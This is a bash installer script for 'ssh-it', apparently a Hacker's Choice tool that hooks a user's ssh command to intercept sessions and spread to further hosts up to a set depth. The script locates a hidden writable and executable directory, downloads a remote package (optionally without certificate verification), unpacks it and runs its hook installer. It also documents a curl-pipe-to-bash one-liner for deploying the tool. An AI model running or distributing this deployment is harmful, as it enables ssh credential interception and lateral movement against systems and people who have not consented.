#! /usr/bin/env bash

# Install and configure ssh-it
#
# See https://www.thc.org/ssh-it/ for more details.
#
# This script is typically invoked likes this:
# 	$ bash -c "$(curl -fsSL thc.org/ssh-it/x)"
#
# Environment variables:
#
# THC_DEPTH=6    - Set depth of when ssh-it shall stop
#
# THC_VERBOSE=1  - Enable verbose warning when ssh is intercepted.
#
# THC_DEBUG=1    - Enable debug output
#
# THC_USELOCAL=1 - Use local binaries (do not use curl/wget to dl static bins)
#
# THC_TMPDIR=/tmp/foobar - Use custom temp directory

URL_BASE="https://github.com/hackerschoice/binary/raw/main/ssh-it/"
URL_DEPLOY="ssh-it.thc.org/x"
DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
PKG_NAME="ssh-it-pkg"
PKG_TGZ="${PKG_NAME}.tar.gz"
PKG_DIR="ssh-it-pkg"

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

_DEFAULT_THC_DEPTH=2

if [[ -z $THC_DEBUG ]]; then
	DEBUGF(){ :;}
else
	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
fi

clean()
{
	DEBUGF "Cleaning '${THC_TMPDIR}'"
	rm -rf "${THC_TMPDIR:?}" &>/dev/null
}

errexit()
{
	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"

	clean
	exit 255
}

OK_OUT()
{
	echo -e 2>&1 "......[${CG}OK${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

FAIL_OUT()
{
	echo -e 1>&2 "..[${CR}FAILED${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

WARN()
{
	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
}

# Directory (/-terminated), e.g. "/tmp/"
# Find a writeable temporary directory
# Examples:
# 	try_tmpdir "/tmp/"
# 	try_tmpdir "/dev/shm/" 
try_tmpdir()
{
	local dstdir
	dstdir="${1}"

	# Create directory if it does not exists.
	[[ ! -d "${dstdir}" ]] && { mkdir -p "${dstdir}" &>/dev/null || return 101; }

	THC_TMPDIR="${dstdir}"
	DSTBIN="${dstdir}/.test-bin"
	# Return if not writeable
	touch "$DSTBIN" &>/dev/null || { return 102; }

	# Test if directory is mounted with noexec flag and return success
	# if binary can be executed from this directory.
	ebin="/bin/true"
	if [[ ! -e "$ebin" ]]; then
		ebin=$(command -v id 2>/dev/null)
		[[ -z "$ebin" ]] && return 0 # Try our best
	fi
	cp -a "$ebin" "$DSTBIN" &>/dev/null || return 0
	"${DSTBIN}" &>/dev/null || { rm -f "${DSTDBIN}"; return 103; } # FAILURE
}

try_execdir()
{
	if [[ -n "$THC_TMPDIR" ]]; then
		try_tmpdir "${THC_TMPDIR}" && return
	else
		[[ -n "$TMPDIR" ]] && try_tmpdir "${TMPDIR}/.${PKG_NAME}-${UID}" && return
		try_tmpdir "/tmp/.${PKG_NAME}-${UID}" && return
		try_tmpdir "${HOME}/.${PKG_NAME}-${UID}" && return
		try_tmpdir "/dev/shm/.${PKG_NAME}-${UID}" && return
	fi

	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
	WARN "Try setting THC_TMPDIR= to a writeable and executable directory."
	errexit
}

init_vars()
{
	local is_set_thc_verbose
	local is_set_thc_depth
	local is_set_thc_recheck_time
	local is_set_thc_testing

	if [[ -z "$HOME" ]]; then
		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
		WARN "HOME not set. Using '$HOME'"
	fi
	
	# Docker does not set USER
	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$UID" ]] && UID=$(id -u)

	[[ -z $THC_DEPTH ]] && THC_DEPTH="${_DEFAULT_THC_DEPTH}"

	[[ -n $THC_NO_VERBOSE ]] && unset THC_VERBOSE

	if [[ -n $THC_DEBUG ]]; then
		# [[ -z $THC_NO_USELOCAL ]] && THC_USELOCAL=1
		# [[ -z $THC_NO_VERBOSE ]] && THC_VERBOSE=1
		:
	fi

	try_execdir

	rm -f "${THC_TMPDIR}/${PKG_NAME}" 2>/dev/null
	rm -f "${THC_TMPDIR}/${PKG_TGZ}" 2>/dev/null

	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
	rm -rf "${PKG_DIR:-/dev/null}" 2>/dev/null
	mkdir "${PKG_DIR}" 2>/dev/null || errexit "Permission denied: mkdir ${PKGDIR}"
	rm -rf "${PKG_DIR:-/dev/null}" 2>/dev/null

	DEBUGF "THC_VERBOSE    = ${THC_VERBOSE}"
	DEBUGF "THC_TESTING    = ${THC_TESTING}"
	DEBUGF "THC_DEPTH      = ${THC_DEPTH}"
	DEBUGF "THC_DEBUG      = ${THC_DEBUG}"
	DEBUGF "THC_USELOCAL   = ${THC_USELOCAL}"
	DEBUGF "THC_TMPDIR     = ${THC_TMPDIR}"
}

ask_nocertcheck()
{
	WARN "Can not verify host. CA Bundle is not installed."
	echo "--> Attempting without certificate verification."
	echo "--> Press any key to continue or CTRL-C to abort..."
	echo -en 1>&2 -en "--> Continuing in "
	local n

	n=10
	while :; do
		echo -en 1>&2 "${n}.."
		n=$((n-1))
		[[ $n -eq 0 ]] && break 
		read -r -t1 -n1 && break
	done
	[[ $n -gt 0 ]] || echo 1>&2 "0"

	THC_NOCERTCHECK=1
}

# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
dl_ssl()
{
	DL_LOG="${5}"$'\n' # URL
	if [[ -z $THC_NOCERTCHECK ]]; then
		DL_LOG+=$("$3" "$4" "$5" "$6" "$7" 2>&1)
		[[ "${DL_LOG}" != *"$2"* ]] && return
	fi

	if [[ -z $THC_NOCERTCHECK ]]; then
		SKIP_OUT
		ask_nocertcheck
	fi
	[[ -z $THC_NOCERTCHECK ]] && return

	echo -en 2>&1 "Downloading binaries without certificate verification................."
	DL_LOG+=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
}

# Download $1 and save it to $2
dl()
{
	[[ -s "$2" ]] && return

	# Need to set DL_CMD before GS_DEBUG check for proper error output
	if [[ -n "$THC_USELOCAL" ]]; then
		DL_CMD="./deploy.sh"
	elif command -v curl >/dev/null; then
		DL_CMD="$DL_CRL"
	elif command -v wget >/dev/null; then
		DL_CMD="$DL_WGT"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
		errexit
	fi

	# Debugging / testing. Use local package if available
	if [[ -n "$THC_USELOCAL" ]]; then
		[[ -f "${1}" ]] && cp "${1}" "${2}" 2>/dev/null && return
		[[ -f "../packaging/${1}" ]] && cp "../packaging/${1}" "${2}" 2>/dev/null && return
		FAIL_OUT "THC_USELOCAL set but deployment binaries not found (${1})..."
		errexit
	fi

	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "CAN NOT HAPPEN"
		errexit
	fi

	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; errexit; } 
}

init_vars

echo -en 2>&1 "Downloading binaries.................................................."
dl "${PKG_TGZ}" "${THC_TMPDIR}/${PKG_TGZ}"
OK_OUT

echo -en 2>&1 "Unpacking binaries...................................................."
# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
(cd "${THC_TMPDIR}" && tar xfz "${PKG_TGZ}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
[[ ! -f "${THC_TMPDIR}/${PKG_NAME}/hook.sh" ]] && { FAIL_OUT "unpacking failed"; errexit; }
OK_OUT

export THC_DEBUG
export THC_VERBOSE
export THC_TESTING
export THC_DEPTH
(cd "${THC_TMPDIR}/${PKG_NAME}" && "./hook.sh" install) || errexit;

clean
exit

